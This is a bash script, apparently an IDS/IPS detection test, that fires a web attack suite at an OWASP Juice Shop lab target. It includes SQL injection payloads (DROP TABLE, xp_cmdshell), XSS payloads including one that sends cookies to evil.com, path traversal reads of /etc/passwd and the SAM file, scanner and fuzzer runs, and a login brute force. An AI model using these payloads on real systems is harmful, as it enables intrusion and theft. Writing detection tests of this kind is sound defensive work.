#!/bin/bash

# Scenario 04: Web Attack Suite — Nhắm vào Juice Shop
# Mục tiêu  : Test phát hiện Web Attack (SQLi, XSS, Path Traversal, Dir Fuzzing)
# Công cụ   : curl (bắt buộc), sqlmap/nikto/gobuster (tùy chọn)
# Target    : Juice Shop qua Nginx Reverse Proxy (HTTPS)
# Phases    : SQL Injection → XSS → Path Traversal → Directory Fuzzing → API Abuse


TARGET="${1:-172.16.1.2}"
LOG_DIR="${2:-/tmp/idps_test_logs}"
SCENARIO_NAME="04_web_attack"
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"

mkdir -p "$LOG_DIR"
LOGFILE="$LOG_DIR/${SCENARIO_NAME}.log"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOGFILE"
}

# Kiểm tra tools
HAS_SQLMAP=false
HAS_NIKTO=false
HAS_GOBUSTER=false
HAS_WFUZZ=false

command -v sqlmap &>/dev/null && HAS_SQLMAP=true
command -v nikto &>/dev/null && HAS_NIKTO=true
command -v gobuster &>/dev/null && HAS_GOBUSTER=true
command -v wfuzz &>/dev/null && HAS_WFUZZ=true


log "SCENARIO 04: Web Attack Suite → https://$TARGET (Juice Shop)"
log "Tools: sqlmap=$HAS_SQLMAP, nikto=$HAS_NIKTO, gobuster=$HAS_GOBUSTER, wfuzz=$HAS_WFUZZ"


# PHASE 1: SQL Injection
# Mục đích: Chèn SQL vào URL parameters → Suricata custom rule DROP
# ML features: HTTP traffic pattern bất thường, nhiều requests tới cùng endpoint

log "PHASE 1: SQL Injection"

# Luôn chạy: Manual SQLi payloads bằng curl
log "[1.1] Manual SQLi: OR 1=1"
log "      → Suricata custom rule sid:1000002 DROP"
curl -sk -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    "https://$TARGET/rest/products/search?q=test'+OR+'1'='1'--" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[1.2] Manual SQLi: UNION SELECT"
log "      → Suricata custom rule sid:1000001 DROP"
curl -sk -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    "https://$TARGET/rest/products/search?q=test'+UNION+SELECT+1,2,3,4,5--" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[1.3] Manual SQLi: DROP TABLE"
curl -sk -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    "https://$TARGET/rest/products/search?q=test';+DROP+TABLE+users;--" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[1.4] Manual SQLi: Comment marker variations"
curl -sk -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    "https://$TARGET/rest/products/search?q=admin'--" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[1.5] Manual SQLi: Blind SQLi (time-based)"
curl -sk -o /dev/null -w "HTTP %{http_code} | Time: %{time_total}s\n" \
    "https://$TARGET/rest/products/search?q=test'+AND+SLEEP(3)--" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

# Batch SQLi: 20 payloads nhanh
log "[1.6] Batch SQLi: 20 payloads nhanh"
SQLI_PAYLOADS=(
    "' OR '1'='1'--"
    "' UNION SELECT null,null,null--"
    "' AND 1=1--"
    "' AND 1=0--"
    "1; DROP TABLE users--"
    "' OR 'x'='x"
    "admin' --"
    "' UNION ALL SELECT 1,2,3--"
    "' OR ''='"
    "'; EXEC xp_cmdshell('dir')--"
    "' AND (SELECT COUNT(*) FROM users) > 0--"
    "1' ORDER BY 1--"
    "1' ORDER BY 10--"
    "' UNION SELECT username,password FROM users--"
    "' OR 1=1 LIMIT 1--"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    "' UNION SELECT @@version--"
    "') OR ('1'='1"
    "'; WAITFOR DELAY '0:0:5'--"
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--"
)
for payload in "${SQLI_PAYLOADS[@]}"; do
    curl -sk -o /dev/null "https://$TARGET/rest/products/search?q=${payload}" &
done
wait
log "      → 20 SQLi payloads gửi xong"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

# SQLMap tự động (nếu có)
if $HAS_SQLMAP; then
    
    log "[1.7] SQLMap: Automated scan"
    timeout 60 sqlmap -u "https://$TARGET/rest/products/search?q=test" \
        --level=3 --risk=2 --batch --technique=BEUSTQ \
        --threads=3 --ignore-code=401 -v 0 --no-cast \
        2>&1 | tail -10 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi

# PHASE 2: XSS Attacks

log "PHASE 2: XSS (Cross-Site Scripting)"

log "[2.1] Reflected XSS: <script> tag"
log "      → Suricata custom rule sid:1000010 DROP"
curl -sk -o /dev/null -w "HTTP %{http_code}\n" \
    "https://$TARGET/#/search?q=<script>alert('XSS')</script>" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[2.2] XSS: Event handler (onerror)"
log "      → Suricata custom rule sid:1000011 DROP"
curl -sk -o /dev/null -w "HTTP %{http_code}\n" \
    "https://$TARGET/#/search?q=<img+src=x+onerror=alert(1)>" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[2.3] XSS: javascript URI"
log "      → Suricata custom rule sid:1000012 DROP"
curl -sk -o /dev/null -w "HTTP %{http_code}\n" \
    "https://$TARGET/#/search?q=javascript:alert(document.cookie)" 2>&1 | tee -a "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

# Batch XSS: 15 payloads
log "[2.4] Batch XSS: 15 payloads"
XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
    "'><script>alert(String.fromCharCode(88,83,83))</script>"
    "<iframe src='javascript:alert(1)'>"
    "<input onfocus=alert(1) autofocus>"
    "<marquee onstart=alert(1)>"
    "<details open ontoggle=alert(1)>"
    "<a href='javascript:alert(1)'>click</a>"
    "\"><script>alert(1)</script>"
    "'-alert(1)-'"
    "<script>document.location='http://evil.com/?c='+document.cookie</script>"
    "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>"
)
for payload in "${XSS_PAYLOADS[@]}"; do
    curl -sk -o /dev/null "https://$TARGET/#/search?q=${payload}" &
done
wait
log "      → 15 XSS payloads gửi xong"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

# Nikto (nếu có)
if $HAS_NIKTO; then
    
    log "[2.5] Nikto: Vulnerability scanner"
    timeout 60 nikto -h "https://$TARGET" -Tuning x -ssl -nointeractive \
        -output "$LOG_DIR/${SCENARIO_NAME}_nikto.txt" \
        2>&1 | tail -10 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi

# PHASE 3: Path Traversal

log "PHASE 3: Path Traversal"

log "[3.1] Direct path traversal"
log "      → Suricata custom rule sid:1000030 DROP"
TRAVERSAL_PAYLOADS=(
    "../../../../etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "....//....//....//etc/passwd"
    "..%252f..%252f..%252fetc/passwd"
    "/etc/passwd%00"
    "..\\..\\..\\windows\\system32\\config\\sam"
    "....\\....\\....\\etc\\passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%c0%af..%c0%af..%c0%afetc/passwd"
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
)
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    curl -sk -o /dev/null -w "HTTP %{http_code} | $payload\n" \
        "https://$TARGET/$payload" 2>&1 | tee -a "$LOGFILE"
    sleep 0.2
done
bash "$SCRIPT_DIR/unblock_and_reset.sh"

# PHASE 4: Directory Fuzzing

log "PHASE 4: Directory / Endpoint Fuzzing"

if $HAS_GOBUSTER; then
    log "[4.1] Gobuster: Directory bruteforce"
    timeout 45 gobuster dir -u "https://$TARGET" \
        -w /usr/share/wordlists/dirb/common.txt \
        -t 30 -x php,html,txt,json -k --no-error \
        -o "$LOG_DIR/${SCENARIO_NAME}_gobuster.txt" \
        2>&1 | tail -10 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
else
    # Fallback: curl + small wordlist
    log "[4.1] Fallback: curl directory fuzzing (50 paths)"
    DIRS=("admin" "login" "api" "config" "backup" "test" "debug" "console"
          "panel" "dashboard" "db" "database" "phpmyadmin" "wp-admin"
          "wp-login" ".env" ".git" "robots.txt" "sitemap.xml" ".htaccess"
          "server-status" "info.php" "phpinfo.php" "shell" "cmd" "exec"
          "upload" "uploads" "files" "downloads" "tmp" "temp" "cache"
          "logs" "log" "error" "errors" "secret" "private" "internal"
          "api/v1" "api/v2" "graphql" "swagger" "docs" "health" "status"
          "metrics" "actuator" "env" "debug/vars" "trace")
    for dir in "${DIRS[@]}"; do
        curl -sk -o /dev/null -w "HTTP %{http_code} /$dir\n" \
            "https://$TARGET/$dir" &
        # 10 requests song song
        if (( ${#DIRS[@]} % 10 == 0 )); then
            wait
        fi
    done
    wait
    log "      → 50 directory probes hoàn tất"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi

if $HAS_WFUZZ; then
    
    log "[4.2] WFUZZ: Parameter fuzzing"
    timeout 30 wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt \
        -u "https://$TARGET/FUZZ" --hc 404 -Z \
        2>&1 | tail -10 | tee -a "$LOGFILE"
    bash "$SCRIPT_DIR/unblock_and_reset.sh"
fi

# PHASE 5: API Abuse (Juice Shop specific)

log "PHASE 5: API Abuse (Juice Shop endpoints)"

log "[5.1] Enumerate users via API"
curl -sk "https://$TARGET/api/Users/" 2>&1 | head -c 200 | tee -a "$LOGFILE"
echo "" >> "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[5.2] Access admin section"
curl -sk "https://$TARGET/api/Challenges/" 2>&1 | head -c 200 | tee -a "$LOGFILE"
echo "" >> "$LOGFILE"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[5.3] Brute force login via API (10 attempts)"
for i in $(seq 1 10); do
    curl -sk -X POST \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"pass$i\"}" \
        "https://$TARGET/rest/user/login" -o /dev/null &
done
wait
log "      → 10 login attempts hoàn tất"
bash "$SCRIPT_DIR/unblock_and_reset.sh"

log "[5.4] Rapid API enumeration (20 endpoints)"
API_ENDPOINTS=(
    "/api/Users/" "/api/Products/" "/api/BasketItems/" "/api/Feedbacks/"
    "/api/Complaints/" "/api/Recycles/" "/api/SecurityQuestions/"
    "/api/Challenges/" "/api/Quantitys/" "/api/Deliverys/"
    "/rest/user/whoami" "/rest/products/search?q=*"
    "/rest/saveLoginIp" "/rest/user/change-password"
    "/rest/captcha/" "/rest/image-captcha/" "/rest/continue-code"
    "/rest/admin/application-version" "/rest/admin/application-configuration"
    "/rest/repeat-notification"
)
for ep in "${API_ENDPOINTS[@]}"; do
    curl -sk -o /dev/null "https://$TARGET$ep" &
done
wait
log "      → 20 API endpoints probed"



log "SCENARIO 04 HOÀN TẤT"
log "Logs: $LOG_DIR/${SCENARIO_NAME}_*.txt"

